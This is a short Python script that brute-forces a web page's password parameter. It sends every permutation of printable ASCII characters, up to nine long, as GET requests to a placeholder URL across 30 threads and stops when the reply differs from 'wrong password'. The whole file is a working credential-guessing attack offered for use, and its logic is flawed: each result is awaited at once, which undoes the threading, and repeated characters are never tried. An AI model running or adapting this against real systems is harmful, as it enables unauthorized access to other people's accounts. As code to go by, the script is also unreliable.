#!/usr/bin/python
import itertools
import requests
import concurrent.futures

def check_website(password):
    r = requests.get("http://website.com/req.php?password="+str(password))
    if r.text == "wrong password":
        print "I'm not found password "+ str(password)
        #return "I'm testing password '" + str(password) + "' It's wrongs :("
        return "I'm not found"
        pass
    else:
        if "Please enter password" in r.text:
            return "I'm not found"
        else:   
            print "I'm found password "+ str(password)
            return "I'm found password '" + str(password) + "' It's right :)"

def returncrawler(fd, lineexec):
    return lineexec.result()

for i in range(1,10):
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            choices = list(range(33, 126))
            for x in itertools.permutations(choices, i):
                c = ''.join(map(chr, x))
                lineexec = executor.submit(check_website, c)
                if "I'm found" in lineexec.result():
                    exit(1)
                    break
